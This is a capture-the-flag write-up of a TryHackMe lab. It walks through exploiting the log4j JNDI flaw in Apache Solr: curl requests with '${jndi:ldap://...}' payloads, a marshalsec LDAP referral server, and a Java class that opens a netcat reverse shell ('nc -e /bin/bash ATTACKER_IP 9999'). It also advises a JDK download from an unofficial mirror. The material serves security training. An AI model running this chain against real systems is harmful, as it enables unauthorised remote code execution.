# CTF - [THM Solar, exploiting log4j](https://tryhackme.com/room/solar)
Nmap scan:
```
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
8983/tcp open  unknown
```

Port 8983 is interesting, navigating to the web server on this port, I found a web app running Apache Solr version 8.11.0. Apparently, this software is known to 
have the vulnerable log4j package.
<br/><br/>
![Screenshot from 2021-12-22 13-53-37](https://user-images.githubusercontent.com/59718043/147141427-ae530fa8-811d-4d3a-a664-ab908b62025e.png)

The dashboard shows indicators that the log4j package is used for the logging activity on this application.
```
-Dsolr.log.dir=/var/solr/logs
```
This machine is supplied with example log files for investigation. In one of the log files, `solr.log`, there are multiple entries of the same requests pointing to
one specific URL endpoint or path. This path is set to `/admin/cores`. Another interesting field is the `params={}`, which we can supply with user input.
```
2021-12-13 03:44:58.415 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=80
2021-12-13 03:47:53.989 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:54.819 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.284 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.682 INFO  (qtp1083962448-22) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.075 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.459 INFO  (qtp1083962448-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.844 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.253 INFO  (qtp1083962448-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.548 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.758 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:58.058 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=1
2021-12-13 03:47:58.346 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0

```
The URL endpoint needs to be prefaced with `solr/`. So the address where we can supply the `params={}` payload 
would look like this: `http://MACHINE_IP:8983/solr/admin/cores`.
<br/><br/>
The payload to abuse this log4j vulnerability looks like this: `${jndi:ldap://ATTACKERCONTROLLEDHOST}`.
This schema reaches out to an attacker controlled endpoint via the LDAP protocol and uses the Java Naming and Directory Interface (JNDI) functionality
to access external resources.
<br/><br/>
To test this theory, we're going to set up a netcat listener then make an HTTP request including the JNDI payload as part of the parameters.
```
nc -nvlp 4444
```
```bash
#!/bin/bash

read -p "LISTENER IP: " attacker
read -p "TARGET IP: " target
curl "http://${target}:8983/solr/admin/cores?foo=$\{jndi:ldap://${attacker}:4444\}"
```
Output:
```
$ bash curl.sh
LISTENER IP: 10.8.219.166
TARGET IP: 10.10.73.44
{
  "responseHeader":{
    "status":0,
    "QTime":3},
  "initFailures":{},
  "status":{}}
```
Netcat output:
```
$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.73.44 57114
0
 `
```
As expected, the output verifies that the target is in fact vulnerable. The netcat listener caught a connection. However, 
the payload we sent only made an LDAP request, so technically we haven't popped a shell yet.<br/>


The exploitation requires us to host an LDAP referral server, which will redirect the victim's request to an HTTP server hosting our secondary payload, ultimately allowing us to run arbitrary code on the target.<br/><br/>
The attack chain would be executed like this:<br/>
- 1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server 
- 2. The LDAP Referral Server then redirects the payload to our HTTP server
- 3. The victim retrieves and executes the code on our HTTP server, which then gives us unauthenticated remote access

We will utilize an open-source LDAP Referral Server utility: [marshalsec](https://github.com/mbechler/marshalsec)<br/>
According the README.md file, Java 8 is required.<br/><br/>
Link to download Java on Linux (we will need `jdk-8u181-linux-x64.tar.gz`): http://mirrors.rootpei.com/jdk/
```bash
#!/bin/bash

sudo mkdir /usr/lib/jvm 

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```
We'll need to clone marshalsec locally and build the utility using maven.
```
git clone https://github.com/mbechler/marshalsec
sudo apt install maven
cd marshalsec
mvn clean package -DskipTests
```
Output:
```
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  51.013 s
[INFO] Finished at: 2021-12-28T18:27:32-05:00
[INFO] ------------------------------------------------------------------------
```
Next, we're going to start the LDAP server, which will wait for incoming connections and redirect those connections to our secondary HTTP server.
We're going to set the server to listen on port 8000.
```
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit"
Listening on 0.0.0.0:1389
```
Now that the LDAP server is running, we can write a Java payload that will be hosted by our secondary server, which will execute a reverse shell once it receives a connection.
```java
//filename: Exploit.java
public class Exploit {
        static {
                try {
                        java.lang.Runtime.getRuntime().exec("nc -e /bin/bash ATTACKER_IP 9999");
                } catch (Exception e) {
                        e.printStackTrace();
                }
        }
}
```
This Java payload executes a netcat listening on port 9999. Once a connection is caught, it will call back to our attacker machine.<br/><br/>
Compile this payload; `javac Exploit.java`.<br/><br/>
Set up a secondary HTTP server.
```
python3 -m http.server
```
Run netcat on port 9999 to receive the reverse shell.
```
nc -nvlp 9999
```
Now that we have all 3 things setup (marshalsec LDAP server, secondary HTTP server, netcat listener), we can run the exploit.
```
curl "http://TARGET_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}"
```
Output:
```
$ curl "http://10.10.137.149:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.219.166:1389/Exploit\}"
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
```
Marshalsec output:
```
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.219.166:8000/#Exploit"
Listening on 0.0.0.0:1389
Send LDAP reference result for Exploit redirecting to http://10.8.219.166:8000/Exploit.class
```
HTTP server output:
```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.137.149 - - [28/Dec/2021 20:15:21] "GET /Exploit.class HTTP/1.1" 200 -
```
Netcat listener:
```
$ nc -nvlp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.137.149 40180
id
uid=1001(solr) gid=1001(solr) groups=1001(solr)
```
```
TO BE CONTINUED
```
